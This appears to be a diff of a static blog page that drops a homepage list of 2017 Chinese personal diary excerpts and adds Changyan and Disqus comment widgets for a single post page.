-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-diary-2017-0416-0422" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/04/22/diary-2017-0416-0422/">病中记 4.16-4.22</a>
-    </h1>
-  
-
-        
-        <a href="/2017/04/22/diary-2017-0416-0422/" class="archive-article-date">
-  	<time datetime="2017-04-22T02:36:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="/assets/blogImg/diary-22.jpg" alt="摄于清明" width="400"></p>
-
-<p>4月马上就要过去<br>似乎日历上，径直就能从3月翻到5月。<br>时间怎么这么快？</p>
-<p>长眠于4月之前的海子，对于时间，有一个生动的说法叫“打马而过”<br>有时觉得，这种匀速流淌不可变的东西，才是真TM的残忍。<br>长江水的结局，就是流到太平洋<br>没有任何意外能让它流到大西洋</p>
-<p>所以你说，有时意外的中断多可爱？<br>红绿灯多好呀，给你走走停停的机会<br>小病多好呀，静下来休息和幻想<br>悲伤多好呀，欢乐可放歌，悲伤可饮酒</p>
-<p>工作忙完了这阵子<br>那条安静而蜿蜒的时间之河，好像真的幻化成了打马的鞭子<br>梦中啪的一声惊响，病倒了。</p>
-        
-          <a class="article-more-a" href="/2017/04/22/diary-2017-0416-0422/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">旧事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/04/22/diary-2017-0416-0422/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-diary-2017-0305-0311" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/12/diary-2017-0305-0311/">我与《刺客信条》 3.5-3.11</a>
-    </h1>
-  
-
-        
-        <a href="/2017/03/12/diary-2017-0305-0311/" class="archive-article-date">
-  	<time datetime="2017-03-12T02:36:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="/assets/blogImg/diary-21.jpg" alt=""></p>
-<h4 id="一"><a href="#一" class="headerlink" title="一"></a>一</h4><p>这周感觉我的vscode已经“玩得贼6”<br>一切来之不易，毕竟是五次卸载sublime改掉的习惯。<br>不过这丝毫不影响我对sublime的喜爱<br>有人问为什么？<br>没法解释。大话西游里也曾说<br>喜欢一个编辑器需要理由吗？</p>
-<p>但有点令人沮丧的是，“喜欢”这件事确实是会变的。</p>
-<p>我有另外的感受，特别是在这周<br>迫不及待地把《刺客信条》电影看完的时候…<br>感觉特别的失望。<br>就是那种经行漫长的等候，期待一场肆无忌惮的雨<br>最后只听到了低沉雷声的空洞感。<br>但是，我也一曾很喜欢这个系列啊。</p>
-<p>可能，再也不会有一款游戏，能给我带来这样的触动了吧。<br>五年前，我还写过点文字<a href="//litten.me/2012/12/18/assassins-creed/">《记“刺客信条”三部曲：水月镜像，无心去来》</a>。</p>
-        
-          <a class="article-more-a" href="/2017/03/12/diary-2017-0305-0311/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">旧事</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">游戏</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/03/12/diary-2017-0305-0311/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-diary-2017-0212-0218" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/02/19/diary-2017-0212-0218/">决战前后 2.12 - 2.18</a>
-    </h1>
-  
-
-        
-        <a href="/2017/02/19/diary-2017-0212-0218/" class="archive-article-date">
-  	<time datetime="2017-02-19T02:36:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-19</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="/assets/blogImg/diary-20.jpg" alt="" width="450"></p>
-
-<p>终于是把T3评审的事情忙完<br>周末躺在床上整个人都不想动，空虚无比，宛如智障。<br>这种状态，只有高考结束时出现过<br>那时我的日记里写着：<br>“我站在太阳下，就是金灿灿的咸鱼；<br>我躺在被窝里，就是阴绵绵的豆腐脑…”<br>别说这是神比喻。</p>
-<p>因为这次评审，确实耗费了挺大的精力<br>关键还是在年后返工的第一周，你正吃着元宵唱着歌<br>突然跑出个班主任说：咱放完寒假就高考，好吗？<br>好生气哦，但还要保持微笑。<br>况且想想，年终奖好像还没发哎…</p>
-        
-          <a class="article-more-a" href="/2017/02/19/diary-2017-0212-0218/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">旧事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/02/19/diary-2017-0212-0218/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-brave-new-world" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/02/10/brave-new-world/">美丽新世界</a>
-    </h1>
-  
-
-        
-        <a href="/2017/02/10/brave-new-world/" class="archive-article-date">
-  	<time datetime="2017-02-10T02:36:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=28949128&auto=0&height=66" style="margin-left: -10px;"></iframe>
-
-<p>痛仰有一首歌，叫《美丽新世界》，它其实是向80年前赫胥黎的同名小说致敬。<br>歌里唱道：<br><strong>“这是一个离奇的梦也是冒险者的乐园<br>不在乎你在不在乎新的世界依旧美丽…”</strong></p>
-<p>乌托邦如此美好，但在那里，幸福的人们全都是“被幸福的”。<br>你的在乎与否无关紧要，只需要按照秩序继续漫步。</p>
-<p>春节把<a href="https://movie.douban.com/subject/2338055/" target="_blank" rel="noopener">《西部世界》</a>看完，它的一些设定，也很容易看出致敬小说的意思，却又带来了另外的惊喜。<br>片尾Dolores的惊艳一枪尘埃落定，现在已经过去一段时间，花哨的剪辑褪出了印象，细微的东西反而更加深刻了。<br>还是想谈一谈这部作品。(含剧透…)</p>
-        
-          <a class="article-more-a" href="/2017/02/10/brave-new-world/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">杂谈</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">笔记</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/02/10/brave-new-world/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-diary-2017-0118-0125" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/01/26/diary-2017-0118-0125/">回乡偶书 1.18 - 1.25</a>
-    </h1>
-  
-
-        
-        <a href="/2017/01/26/diary-2017-0118-0125/" class="archive-article-date">
-  	<time datetime="2017-01-26T02:36:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="/assets/blogImg/diary-19.jpg" alt="" width="450"></p>
-
-<p>年底恰逢乔迁，回去得比较早。<br>其实也算不上乔迁，爷爷的旧宅子，父辈兄弟合力，翻修重建<br>多了一个出逃城市，到乡村度假的地方。<br>当它以新面貌出现在眼前时<br>不免真的觉得衰败的新生相当感慨。</p>
-<p>特别是在年底，这个喜旧迎新的时节<br>好像很多往事，被年关一催，不断提纯<br>又沉淀出了最好的那部分。<br>然后你看着它，只能很简单又笃定的说一声：<br>好棒哦！</p>
-<p>但说起新居入伙，有件事我想起就想笑。<br>大概10岁时，第一次搬家，有个迷之仪式印象太深刻。<br>按着习俗，我左手要拿着一根葱，葱通聪，象征聪明伶俐<br>右手拿一根蒜，蒜通算，意思是会算术。<br>这活脱就是一羞耻的莹草cosplay啊</p>
-        
-          <a class="article-more-a" href="/2017/01/26/diary-2017-0118-0125/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">旧事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/01/26/diary-2017-0118-0125/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
-    </nav>
+  
+
+  
+  <div id="SOHUCS" sid="safety-point-of-view-from-front-end"></div> 
+<script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js"></script>
+<script type="text/javascript">
+    window.changyan.api.config({
+        appid: "cysX3aGWt",
+        conf: "prod_1dcda447175aada96edcdb7e412338fa"
+    });
+</script>
+
+  
+
+  
+    <section id="comments">
+      <div id="disqus_thread"></div>
+        <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'true'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </section>
+  
+
   
 
 
@@ -974,8 +436,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
